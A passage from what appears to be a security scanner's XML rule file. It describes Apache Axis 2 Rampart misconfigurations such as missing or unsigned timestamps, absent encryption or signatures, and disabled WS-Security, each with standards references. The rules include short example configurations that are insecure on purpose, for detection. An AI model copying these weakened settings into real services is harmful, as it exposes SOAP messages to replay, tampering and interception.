							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, it might be possible to intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following Apache Axis 2 Rampart configuration omits the <code>Timestamp</code> directive from the <code>&lt;items&gt;</code> tag, so the service does not require requests to contain timestamps.<br><pre><br>&lt;service&gt;<br>...<br>      &lt;action&gt;<br>        &lt;items&gt;Signature Encrypt&lt;/items&gt;<br>...<br>&lt;/service&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3870 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3870 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3870 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3870 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_provider_misconfiguration_missing_outbound_encryption
		</key>
		<internalKey>Environment/Axis 2 Service Provider
			Misconfiguration/Missing Outbound Encryption
		</internalKey>
		<name>Axis 2 Service Provider Misconfiguration: Missing Outbound
			Encryption
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Unencrypted messages fail to protect confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Encryption at the SOAP message level ensures true end-to-end confidentiality. SOAP messages can be sent over a number transport protocols such as HTTPS, HTTP, TCP, SMTP, UDP, etc. Message-level encryption ensures the confidentiality of the message regardless of the transport protocol. A common scenario among web services is to relay SOAP messages between services, so message-level encryption means message senders and receivers do not need to worry about all transport security between any relay points.<br><br>The following Apache Axis 2 Rampart configuration does not require outbound messages to be encrypted since the <code>&lt;items&gt;</code> tag does not contain an <code>Encrypt</code> directive:<br><pre><br>&lt;service&gt;<br>...<br>	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;<br>		&lt;action&gt;<br>			&lt;items&gt;Timestamp Signature&lt;/items&gt;<br>			...<br>		&lt;/action&gt;<br>	&lt;/parameter&gt;<br>&lt;/service&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_provider_misconfiguration_missing_outbound_signature
		</key>
		<internalKey>Environment/Axis 2 Service Provider
			Misconfiguration/Missing Outbound Signature
		</internalKey>
		<name>Axis 2 Service Provider Misconfiguration: Missing Outbound
			Signature
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing signature means the integrity of a SOAP message cannot be guaranteed.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Any part of a message that is not signed has the potential to be intercepted and modified without the modification being detected by the receiver. Without a signature, a receiver cannot cryptographically verify the integrity or origin of the message contents.<br><br>The following service provider configuration tells Axis 2 to send unsigned timestamps:<br><pre><br>&lt;service&gt;<br>...<br>	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;<br>		&lt;action&gt;<br>			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;<br>			...<br>		&lt;/action&gt;<br>	&lt;/parameter&gt;<br>&lt;/service&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_provider_misconfiguration_missing_outbound_timestamp
		</key>
		<internalKey>Environment/Axis 2 Service Provider
			Misconfiguration/Missing Outbound Timestamp
		</internalKey>
		<name>Axis 2 Service Provider Misconfiguration: Missing Outbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing timestamp can leave a SOAP message open to replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates the freshness of a message's security data. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker could intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can trick a recipient into accepting a malicious message.<br><br>The following Apache Axis 2 Rampart configuration omits the <code>Timestamp</code> directive from the <code>&lt;items&gt;</code> tag, so the service does not send messages with timestamps.<br><pre><br>&lt;service&gt;<br>...<br>   &lt;parameter name=&quot;OutflowSecurity&quot;&gt;<br>      &lt;action&gt;<br>        &lt;items&gt;Signature Encrypt&lt;/items&gt;<br>...<br>&lt;/service&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3870 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3870 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3870 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3870 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_provider_misconfiguration_outbound_ws_security_not_enabled
		</key>
		<internalKey>Environment/Axis 2 Service Provider
			Misconfiguration/Outbound WS-Security Not Enabled
		</internalKey>
		<name>Axis 2 Service Provider Misconfiguration: Outbound WS-Security
			Not Enabled
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Service providers that don't use WS-Security might not be able to guarantee message integrity or confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  WS-Security is an extension of SOAP that provides end-to-end message integrity and confidentiality regardless of the transport protocol. When WS-Security is not used, messages rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security removes the transport security dependency and secures the message itself.<br><br>. The absence of an <code>OutflowSecurity</code> parameter in the Apache Axis 2 configuration file indicates that outbound message security is not enabled.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_provider_misconfiguration_unsigned_inbound_timestamp
		</key>
		<internalKey>Environment/Axis 2 Service Provider
			Misconfiguration/Unsigned Inbound Timestamp
		</internalKey>
		<name>Axis 2 Service Provider Misconfiguration: Unsigned Inbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An unsigned timestamp can leave a SOAP message open to tampering and replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker can intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following service provider configuration tells Axis 2 to accept messages with unsigned timestamps:<br><pre><br>&lt;service&gt;<br>...<br>	&lt;parameter name=&quot;InflowSecurity&quot;&gt;<br>		&lt;action&gt;<br>			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;<br>			...<br>		&lt;/action&gt;<br>	&lt;/parameter&gt;<br>&lt;/service&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>
																									   <p>[16]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_provider_misconfiguration_unsigned_outbound_timestamp
		</key>
		<internalKey>Environment/Axis 2 Service Provider
			Misconfiguration/Unsigned Outbound Timestamp
		</internalKey>
		<name>Axis 2 Service Provider Misconfiguration: Unsigned Outbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An unsigned timestamp can leave a SOAP message open to tampering and replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Security timestamps indicate the "freshness" of message security semantics. So if a message is intercepted an retransmitted at a later time, the receiver can reject stale messages. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, it might be possible to intercept a SOAP message and modify the timestamp without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following service provider configuration tells Axis 2 to send unsigned timestamps:<br><pre><br>&lt;service&gt;<br>        ...<br>	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;<br>		&lt;action&gt;<br>			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;<br>			...<br>		&lt;/action&gt;<br>	&lt;/parameter&gt;<br>&lt;/service&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>
																									   <p>[16]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_provider_misconfiguration_ws_security_not_enabled
		</key>
		<internalKey>Environment/Axis 2 Service Provider
			Misconfiguration/WS-Security Not Enabled
		</internalKey>
		<name>Axis 2 Service Provider Misconfiguration: WS-Security Not
			Enabled
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Turning off WS-Security makes it hard to guarantee message integrity and confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Rampart WS-Security module is not enabled. WS-Security is an extension of SOAP that provides end-to-end message integrity and confidentiality regardless of the transport protocol. When WS-Security is not used, messages rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security eliminates the transport security dependency and builds security into the message itself.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_provider_misconfiguration_weak_token
		</key>
		<internalKey>Environment/Axis 2 Service Provider Misconfiguration/Weak
			Token
		</internalKey>
		<name>Axis 2 Service Provider Misconfiguration: Weak Token</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using a UsernameToken with a plain text password over an unencrypted channel exposes the password to attackers who can sniff the SOAP messages.
